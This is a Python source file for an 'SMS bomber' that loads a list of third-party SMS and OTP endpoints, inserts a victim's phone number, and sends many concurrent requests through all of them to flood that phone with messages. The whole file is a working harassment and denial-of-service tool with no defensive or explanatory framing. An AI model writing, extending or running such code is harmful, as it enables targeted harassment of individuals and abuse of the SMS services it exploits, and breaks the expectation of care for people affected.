# sms_bomber.py
import json
import asyncio
import aiohttp
from utils.logger import setup_logger

logger = setup_logger()

class SMSBomber:
    def __init__(self):
        with open("data/sms_apis.json", "r") as f:
            self.apis = json.load(f)

    async def _send(self, session, api, phone):
        try:
            url = api["url"].replace("{phone}", phone)
            method = api.get("method", "POST").upper()
            headers = api.get("headers", {})
            body = api.get("body", {})

            # Replace placeholders
            if body:
                body = {k: v.replace("{phone}", phone) for k, v in body.items()}

            if method == "GET":
                async with session.get(url, headers=headers, timeout=10) as resp:
                    return resp.status
            else:
                async with session.post(url, headers=headers, json=body, timeout=10) as resp:
                    return resp.status
        except Exception as e:
            logger.debug(f"API {api.get('name')} failed: {e}")
            return None

    async def bomb(self, phone, count=50, threads=10):
        sem = asyncio.Semaphore(threads)
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(count):
                for api in self.apis:
                    tasks.append(self._send_with_sem(sem, session, api, phone))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            success = sum(1 for r in results if isinstance(r, int) and r < 400)
            logger.info(f"SMS Bombing done: {success} success out of {len(tasks)}")
            return success

    async def _send_with_sem(self, sem, session, api, phone):
        async with sem:
            return await self._send(session, api, phone)
